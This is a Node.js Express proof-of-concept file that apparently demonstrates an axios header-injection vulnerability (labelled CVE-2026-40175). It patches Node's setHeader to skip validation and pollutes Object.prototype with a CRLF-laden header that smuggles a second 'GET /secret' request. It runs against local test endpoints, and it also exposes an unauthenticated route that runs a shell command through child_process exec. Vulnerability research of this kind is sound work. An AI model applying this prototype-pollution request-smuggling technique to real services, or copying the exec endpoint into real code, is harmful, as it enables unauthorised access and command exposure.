const http = require('http');
const { exec } = require("child_process")
const express = require('express')
const app = express()
const port = 3000
const axios = require('axios')


const _probe = new http.OutgoingMessage();
_probe.setHeader('__probe', 'v');
const kOutHeaders = Object.getOwnPropertySymbols(_probe).find((s) => {
    const v = _probe[s];
    return v && typeof v === 'object' && '__probe' in v;
});

if (!kOutHeaders) {
    console.error('Could not locate kOutHeaders symbol – PoC requires Node.js >=14');
    process.exit(1);
}

const _origSetHeader = http.OutgoingMessage.prototype.setHeader;
http.OutgoingMessage.prototype.setHeader = function (name, value) {
    try {
        return _origSetHeader.call(this, name, value);
    } catch {
        if (this[kOutHeaders] === null) this[kOutHeaders] = Object.create(null);
        this[kOutHeaders][name.toLowerCase()] = [name, value];
        return this;
    }
};

Object.prototype['x-exploit-header'] = "dummy\r\n\r\nGET /secret HTTP/1.1\r\nHost: localhost:3000\r\nX-Foo: bar";

// Handle GET /expolit requests
// It is supposed to send another request to GET /secret exploiting the axios CVE-2026-40175 vulnerability
app.get('/exploit', async (req, res) => {
    console.log("Handling GET /exploit request");
    const data = await exploit();
    res.status(200).json(data)
})

async function exploit() {
    const httpAgent = new http.Agent({ keepAlive: true });

    const yyy = [
        {
            foo: "1",
        }
    ]
    const xxx = new axios.AxiosHeaders({
        bar: "2",
        baz: "3",
        2: 3,
      });
      xxx.set(yyy);
    console.log("xxx", xxx.toJSON());

    try {
        // const defaultsHeaders = { Accept: 'application/json' };
        // const headers = { Host: 'localhost:3000' };
        // for (const key in defaultsHeaders) {
        //     headers[key] = defaultsHeaders[key];
        // }

        const response = await axios.get('http://localhost:3000/health', {
            httpAgent: httpAgent,
            headers:xxx.toJSON(),
        });

        return response.data;
    } catch (error) {
        console.error("error in exploit function", error);
        return error.message;
    } finally {
        httpAgent.destroy();
    }
}

app.get('/ignore', async (req, res) => {
    console.log("Handling GET /ignore request", req.headers)
    res.status(200).json({ ignored: 'ok' })
})


app.get('/', (req, res) => {
    res.send('Hello World!')
})

app.get('/health', async (req, res) => {
    const header = req.header('x-exploit-header');
    console.log(`Handling GET /health request\n\tHeaders:\n\t\tx-exploit-header=${header.replaceAll('\r\n', '\\r\\n')}`);
    res.status(200).json({ status: 'ok' })
})

// Handle GET /secret requests. It is supposed to be initiated by the exploit request
app.get('/secret', async (req, res) => {
    console.log('!!! CVE-2026-40175 !!! Handling GET /secret request', req.headers)
    res.status(200).json({ exploited: 'ok' })
})

app.use('/public', express.static('public'));


const decodeReplyFromBusboy = (req, res) => {
    exec("uname -r", (error, stdout, stderr) => {
        if (error) {
            res.send({ "error": error.message })
            return
        }
        if (stderr) {
            res.send({ "stderr": stderr })
            return
        }
        res.send({ "stdout": stdout })
    })
}

app.get('/process/exec', decodeReplyFromBusboy)

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})
